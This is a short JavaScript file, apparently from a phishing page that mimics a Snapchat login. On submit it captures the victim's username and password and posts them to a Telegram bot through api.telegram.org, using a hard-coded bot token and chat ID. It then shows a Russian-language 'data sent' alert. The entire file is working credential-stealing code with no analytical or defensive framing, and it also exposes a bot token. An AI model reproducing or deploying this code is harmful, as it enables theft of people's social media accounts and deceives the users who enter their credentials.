const telegramToken = '7559120185:AAFdssHiqoX9u_aShy5APxzKaqtGngI2Qw4';
const chatId = '6594526203';

const sendToTelegram = async (data) => {
  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
  const message = `👻 Snapchat Login:\n\n📧 Username: ${data.login}\n🔒 Password: ${data.password}`;

  try {
    await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
  } catch (error) {
    console.error('Ошибка отправки в Telegram:', error);
  }
};

const form = document.getElementById('loginForm');
form.addEventListener('submit', async (event) => {
  event.preventDefault();

  const login = document.getElementById('login').value;
  const password = document.getElementById('password').value;

  const data = { login, password };

  await sendToTelegram(data);

  alert('Данные отправлены!');
});
